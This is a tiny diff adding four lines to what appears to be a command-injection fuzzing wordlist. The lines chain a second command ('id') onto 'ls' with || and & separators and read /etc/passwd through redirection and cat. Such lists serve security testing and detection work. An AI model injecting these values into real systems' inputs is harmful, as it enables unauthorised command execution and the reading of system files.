@@ -1,0 +1,4 @@
+ls||id; ls ||id; ls|| id; ls || id
+ls&id; ls &id; ls& id; ls & id
+< /etc/passwd
+/usr/bin/cat /etc/passwd | ls
